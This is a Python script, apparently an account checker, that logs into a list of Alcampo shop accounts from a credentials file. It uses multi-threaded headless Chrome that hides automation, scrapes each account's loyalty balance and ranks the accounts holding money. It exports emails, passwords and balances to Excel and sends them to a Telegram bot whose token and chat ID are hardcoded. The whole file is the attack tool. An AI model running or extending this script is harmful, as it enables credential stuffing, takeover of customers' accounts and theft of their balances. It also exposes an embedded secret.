import sys
import time
import re
import json
import argparse
import os
import threading
import builtins
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import pandas as pd

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')

ROOT = Path(__file__).resolve().parent
ACCOUNTS_FILE = ROOT / "accounts.json"
EXCEL_FILE = ROOT / "saldos_alcampo.xlsx"

# Lock for thread-safe file writing and printing
log_lock = threading.Lock()

# Global state for progress tracking
progress_state = {
    "total": 0,
    "processed": 0,
    "success": 0,
    "money": 0,
    "zero": 0,
    "error": 0,
    "total_balance": 0.0,
    "start_time": 0.0,
    "elapsed": 0.0,
    "eta": None,
    "threads": {}
}

# --- GLOBAL PRINT INTERCEPTION ---
original_print = builtins.print

def print_and_log(*args, **kwargs):
    """Intercepts print calls to write them to consola.log in real-time."""
    sep = kwargs.get('sep', ' ')
    end = kwargs.get('end', '\n')
    file = kwargs.get('file', None)
    
    # We only intercept stdout/stderr prints
    if file is None or file == sys.stdout or file == sys.stderr:
        msg = sep.join(str(arg) for arg in args)
        kwargs['flush'] = True  # Force auto-flushing to prevent buffering in logs
        with log_lock:
            original_print(*args, **kwargs)
            try:
                with open(ROOT / "consola.log", "a", encoding="utf-8") as f:
                    f.write(msg + end)
            except Exception:
                pass
    else:
        original_print(*args, **kwargs)

# Replace built-in print globally
builtins.print = print_and_log


# --- PROGRESS TRACKING FUNCTIONS ---
def init_progress(total_accounts):
    """Initializes the progress files before scraping starts."""
    global progress_state
    with log_lock:
        progress_state["total"] = total_accounts
        progress_state["processed"] = 0
        progress_state["success"] = 0
        progress_state["money"] = 0
        progress_state["zero"] = 0
        progress_state["error"] = 0
        progress_state["total_balance"] = 0.0
        progress_state["start_time"] = time.time()
        progress_state["elapsed"] = 0.0
        progress_state["eta"] = None
        progress_state["threads"] = {}

        # Reset consola.log and write initial progreso.json
        try:
            if os.path.exists(ROOT / "consola.log"):
                os.remove(ROOT / "consola.log")
        except Exception:
            pass

        try:
            with open(ROOT / "progreso.json", "w", encoding="utf-8") as f:
                json.dump(progress_state, f, indent=4)
        except Exception:
            pass

        # Asynchronously reset Firebase Realtime DB if URL is configured
        firebase_url = os.environ.get("FIREBASE_DB_URL")
        if firebase_url:
            try:
                def reset_firebase():
                    try:
                        url = firebase_url.strip()
                        prog_url = url.rstrip('/') + "/progress.json"
                        requests.put(prog_url, json=progress_state, timeout=5)
                        
                        logs_url = url.rstrip('/') + "/logs.json"
                        requests.put(logs_url, json="🚀 [SISTEMA] Iniciando Alcampo Scraper v2.0 (Optimizado)...\n", timeout=5)
                    except Exception:
                        pass
                threading.Thread(target=reset_firebase, daemon=True).start()
            except Exception:
                pass

def update_progress(thread_idx, email, status, saldo_str):
    """Thread-safely updates progress metrics, saves to progreso.json, and pushes to Firebase."""
    global progress_state
    
    # Parse balance to calculate metrics
    saldo_val = limpiar_saldo(saldo_str)
    
    with log_lock:
        progress_state["processed"] += 1
        
        if status == "success":
            progress_state["success"] += 1
            if saldo_val is not None:
                progress_state["total_balance"] += saldo_val
                if saldo_val > 0:
                    progress_state["money"] += 1
                else:
                    progress_state["zero"] += 1
            else:
                progress_state["error"] += 1
        else:
            progress_state["error"] += 1
            
        # Calculate time metrics
        elapsed = time.time() - progress_state["start_time"]
        progress_state["elapsed"] = elapsed
        
        if progress_state["processed"] > 0:
            avg_time = elapsed / progress_state["processed"]
            remaining = progress_state["total"] - progress_state["processed"]
            progress_state["eta"] = remaining * avg_time
            
        # Update specific thread status
        progress_state["threads"][str(thread_idx)] = {
            "last_account": email,
            "last_status": status,
            "timestamp": time.time()
        }
        
        # Save to file
        try:
            with open(ROOT / "progreso.json", "w", encoding="utf-8") as f:
                json.dump(progress_state, f, indent=4)
        except Exception:
            pass

        # Asynchronously push to Firebase Realtime DB if URL is configured
        # Push only every 3 accounts to avoid overloading the network/Firebase limits, or at the end
        firebase_url = os.environ.get("FIREBASE_DB_URL")
        if firebase_url and (progress_state["processed"] % 3 == 0 or progress_state["processed"] == progress_state["total"]):
            try:
                def push_to_firebase(state_snap):
                    try:
                        url = firebase_url.strip()
                        # Push progress
                        prog_url = url.rstrip('/') + "/progress.json"
                        requests.put(prog_url, json=state_snap, timeout=5)
                        
                        # Push latest logs (last 100 lines)
                        try:
                            log_path = ROOT / "consola.log"
                            if log_path.exists():
                                with open(log_path, "r", encoding="utf-8") as f:
                                    lines = f.readlines()
                                latest_logs = "".join(lines[-100:])
                                logs_url = url.rstrip('/') + "/logs.json"
                                requests.put(logs_url, json=latest_logs, timeout=5)
                        except Exception:
                            pass
                    except Exception:
                        pass
                # Shallow copy the state to avoid thread race conditions
                state_snap = json.loads(json.dumps(progress_state))
                threading.Thread(target=push_to_firebase, args=(state_snap,), daemon=True).start()
            except Exception:
                pass


# Install ChromeDriver once globally
try:
    CHROME_DRIVER_PATH = ChromeDriverManager().install()
    print(f"ChromeDriver installed by webdriver_manager at: {CHROME_DRIVER_PATH}")
except Exception as e:
    print(f"Error installing ChromeDriver with webdriver_manager: {e}")
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    print(f"Falling back to system ChromeDriver at: {CHROME_DRIVER_PATH}")


def parse_args():
    parser = argparse.ArgumentParser(description="Alcampo Account Balance Scraper (Optimized)")
    parser.add_argument(
        "--send-telegram", 
        action="store_true", 
        help="Enables sending summary and excel file to Telegram"
    )
    parser.add_argument(
        "--threads", 
        type=int, 
        default=6, 
        help="Number of concurrent threads (default: 6)"
    )
    parser.add_argument(
        "--limit", 
        type=int, 
        default=None, 
        help="Limit execution to first N accounts (for testing)"
    )
    return parser.parse_args()


def enviar_telegram_texto(token, chat_id, mensaje):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": mensaje}
    try:
        response = requests.post(url, data=data)
        print(f"📡 Enviando a Telegram: {response.status_code} - {response.text}")
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Error enviando a Telegram: {e}")


def enviar_telegram_documento(token, chat_id, path, caption=""):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        with open(path, "rb") as file:
            data = {"chat_id": chat_id, "caption": caption}
            response = requests.post(url, data=data, files={"document": file})
            print(f"📁 Enviando documento a Telegram: {response.status_code} - {response.text}")
            response.raise_for_status()
    except Exception as e:
        print(f"❌ Error enviando documento a Telegram: {e}")


def procesar_bloque(accounts_chunk, thread_idx):
    resultados = []
    driver = None
    
    def init_driver():
        nonlocal driver
        if driver:
            try:
                driver.quit()
            except:
                pass
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.page_load_strategy = "eager"
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        driver = webdriver.Chrome(
            service=Service(CHROME_DRIVER_PATH),
            options=chrome_options
        )
        driver.set_page_load_timeout(20)
        driver.implicitly_wait(1)

    for idx, acc in enumerate(accounts_chunk):
        email = acc["email"]
        password = acc["password"]
        print(f"[Hilo {thread_idx}] → Procesando ({idx+1}/{len(accounts_chunk)}): {email}")
        
        intentos_max = 2
        saldo = "Error: Desconocido"
        
        for intento in range(1, intentos_max + 1):
            try:
                if not driver:
                    init_driver()
                
                # 1. Cargar login
                driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                wait = WebDriverWait(driver, 10)
                email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
                password_field = driver.find_element(By.ID, "pwd1")
                
                # 2. Rellenar credenciales y enviar
                email_field.send_keys(email)
                password_field.send_keys(password)
                password_field.send_keys(Keys.ENTER)
                
                # 3. Esperar redirección que indica login correcto
                try:
                    WebDriverWait(driver, 15).until(
                        lambda d: "compraonline.alcampo.es" in d.current_url and "login" not in d.current_url
                    )
                except Exception:
                    if "login" in driver.current_url or "my.site.com" in driver.current_url:
                        print(f"[Hilo {thread_idx}] ⚠️ Credenciales incorrectas o bloqueo para: {email}")
                        saldo = "Error: Credenciales incorrectas/bloqueo"
                        break  # No reintentar si son credenciales incorrectas directas
                    raise
                    
                # 4. Obtener cookies de la sesión
                cookies = driver.get_cookies()
                user_agent = driver.execute_script("return navigator.userAgent;")
                
                # 5. Hacer petición HTTP con requests para el saldo
                session = requests.Session()
                for cookie in cookies:
                    name = cookie['name']
                    val = cookie['value']
                    try:
                        name.encode('latin-1')
                    except UnicodeEncodeError:
                        name = name.encode('utf-8').decode('latin-1')
                    try:
                        val.encode('latin-1')
                    except UnicodeEncodeError:
                        val = val.encode('utf-8').decode('latin-1')
                    session.cookies.set(name, val)
                    
                headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
                }
                
                res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
                if res.status_code != 200:
                    raise Exception(f"HTTP Error {res.status_code}")
                    
                # 6. Parsear saldo usando regex
                saldo = "No encontrado"
                match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
                if match:
                    saldo = f"Tu Saldo es {match.group(1)} €"
                else:
                    # Fallback: quitar tags y probar regex
                    cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
                    cleaned_text = ' '.join(cleaned_text.split())
                    match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
                    if match_text:
                        saldo = f"Tu Saldo es {match_text.group(1)} €"
                    else:
                        match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                        if match_alt:
                            saldo = f"Tu Saldo es {match_alt.group(1)} €"
                
                print(f"[Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
                break
                
            except Exception as e:
                print(f"[Hilo {thread_idx}] ❌ Error en {email} (Intento {intento}/{intentos_max}): {e}")
                # Cerrar driver en caso de error/congelación para forzar recreación
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = None
                if intento == intentos_max:
                    saldo = f"Error: {e}"
                    
        resultados.append({"email": email, "password": password, "saldo": saldo})
        
        # Update real-time progress state
        status = "error" if ("Error" in saldo or "No encontrado" in saldo) else "success"
        update_progress(thread_idx, email, status, saldo)
        
        # 7. Borrar cookies cross-domain vía CDP y localStorage para preparar siguiente cuenta
        if driver:
            try:
                driver.execute_cdp_cmd('Network.clearBrowserCookies', {})
                driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
            except Exception:
                # Si falla al limpiar, cerramos y forzamos recreación
                try:
                    driver.quit()
                except:
                    pass
                driver = None
                
    if driver:
        try:
            driver.quit()
        except:
            pass
            
    return resultados


def limpiar_saldo(saldo_str):
    if saldo_str is None:
        return None
    texto = str(saldo_str).strip()
    if not texto or "Error" in texto or "No encontrado" in texto:
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
    if not match:
        return None
    limpio = match.group(0).replace(',', '.')
    try:
        return float(limpio)
    except ValueError:
        return None


def main():
    args = parse_args()
    
    # Telegram config fallback
    telegram_token = os.environ.get("TELEGRAM_TOKEN", "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "-5049278431")
    
    # Convert chat_id to int if it's a string representation of an int
    try:
        chat_id = int(chat_id)
    except ValueError:
        pass

    # Cargar cuentas
    if not ACCOUNTS_FILE.exists():
        print(f"❌ Error: No se encuentra {ACCOUNTS_FILE}")
        sys.exit(1)
        
    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        accounts = json.load(f)
        
    if args.limit:
        accounts = accounts[:args.limit]
        print(f"ℹ️ Modo prueba: Limitado a las primeras {args.limit} cuentas.")

    # Initialize progress files
    init_progress(len(accounts))

    # Repartir cuentas equitativamente entre los hilos
    num_threads = min(args.threads, len(accounts))
    if num_threads == 0:
        num_threads = 1
        
    chunks = [[] for _ in range(num_threads)]
    for i, acc in enumerate(accounts):
        chunks[i % num_threads].append(acc)

    print(f"🚀 Iniciando verificación de {len(accounts)} cuentas repartidas en {num_threads} hilos (reutilizando navegadores)...")
    
    if args.send_telegram:
        try:
            enviar_telegram_texto(telegram_token, chat_id, f"🚀 Iniciando script de Alcampo optimizado en la nube ({len(accounts)} cuentas con {num_threads} hilos)...")
        except Exception as e:
            print(f"Error enviando mensaje inicial a Telegram: {e}")
            
    resultados = []
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {
            executor.submit(procesar_bloque, chunks[i], i + 1): i
            for i in range(num_threads)
        }
        for future in as_completed(futures):
            resultados.extend(future.result())
            
    end_time = time.time()
    duration = end_time - start_time
    
    # Guardar Excel
    df = pd.DataFrame(resultados)
    df.to_excel(EXCEL_FILE, index=False)
    print(f"\n💾 Resultados guardados en: {EXCEL_FILE}")
    print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
    
    # Resumen
    saldo_total = 0.0
    cuenta_top = {"email": "N/A", "saldo_val": 0.0}
    cuentas_con_saldo = 0
    cuentas_saldo_cero = 0
    cuentas_error = 0
    
    for r in resultados:
        valor = limpiar_saldo(r.get("saldo"))
        if valor is None:
            cuentas_error += 1
            continue
        saldo_total += valor
        if valor > 0:
            cuentas_con_saldo += 1
        elif valor == 0:
            cuentas_saldo_cero += 1
        if valor > cuenta_top["saldo_val"]:
            cuenta_top = {"email": r["email"], "saldo_val": valor}
            
    mensaje_resumen = (
        f"📊 **RESUMEN ALCAMPO OPTIMIZADO**\n\n"
        f"✅ Cuentas procesadas: {len(resultados)}\n"
        f"⏱️ Tiempo empleado: {duration/60:.2f} min\n"
        f"💰 **Saldo Total:** {saldo_total:.2f} €\n"
        f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
        f"💤 Cuentas con saldo 0: {cuentas_saldo_cero}\n"
        f"⚠️ Cuentas con error/sin saldo: {cuentas_error}\n"
        f"🏆 **Top Cuenta:** {cuenta_top['email']} ({cuenta_top['saldo_val']:.2f} €)"
    )
    
    print("\n" + mensaje_resumen)
    
    if args.send_telegram:
        enviar_telegram_texto(telegram_token, chat_id, mensaje_resumen)
        enviar_telegram_documento(
            telegram_token, 
            chat_id, 
            EXCEL_FILE, 
            caption="📊 Reporte de saldos de cuentas Alcampo"
        )
        print("🎉 Proceso completo y enviado a Telegram.")
    else:
        print("ℹ️ Envío a Telegram desactivado. Usa --send-telegram para activarlo.")


if __name__ == "__main__":
    main()
